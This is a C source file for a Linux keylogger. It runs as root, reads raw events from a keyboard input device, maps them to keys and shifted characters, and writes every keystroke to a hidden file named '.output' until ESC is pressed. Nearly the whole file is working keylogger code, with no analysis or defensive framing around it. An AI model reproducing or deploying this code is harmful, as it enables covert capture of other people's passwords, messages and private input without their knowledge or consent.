#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <signal.h>

#include "keylogger.h"

#define UK "UNKNOWN"
#define ESCAPE(key) (key == KEY_ESC)
#define SHIFT(key)  ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))

static const char *keycodes[] =
{
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
    "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};

static const char *shifted_keycodes[] =
{
    "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
    "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
    "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
    "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
    "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
    "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
    "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};


static int   running;
static int   keyboard_fd;
static char *output_file = ".output";


static void sig_handler(int signo)
{
    running = 0;
}

static void keylogger_usage(void)
{
    printf("\nPlease run as root\n");
    exit(EXIT_FAILURE);
}

void keylogger_init(char *ofile)
{
    signal(SIGINT, sig_handler);

    running = 1;
    output_file = ".output";

    if (geteuid() != 0)
        keylogger_usage();

    if ((keyboard_fd = open(KEYBOARD, O_RDONLY)) < 0) {
        fprintf(stderr, "\nUnable to read from the device\n");
        exit(EXIT_FAILURE);
    }
}

void keylogger_exit(void)
{
    close(keyboard_fd);
}

void keylogger_run(void)
{
    FILE *file = NULL;
    int shift_flag = 0;
    struct input_event event;

    file = fopen(output_file, "w");

    while (running) {
        read(keyboard_fd, &event, sizeof(event));

        if (event.type == EV_KEY && event.value == 1) {
            if (ESCAPE(event.code))
                return;

            if (SHIFT(event.code))
                shift_flag = event.code;

            if (shift_flag && !SHIFT(event.code))
                fprintf(file, "%s", shifted_keycodes[event.code]);
            
            else if (!shift_flag && !SHIFT(event.code))
                fprintf(file, "%s", keycodes[event.code]);

            fflush(file);
        }
        else {
            if (event.type == EV_KEY && event.value == 0)
                if (SHIFT(event.code))
                    shift_flag = 0;
        }
    }

    fclose(file);
}
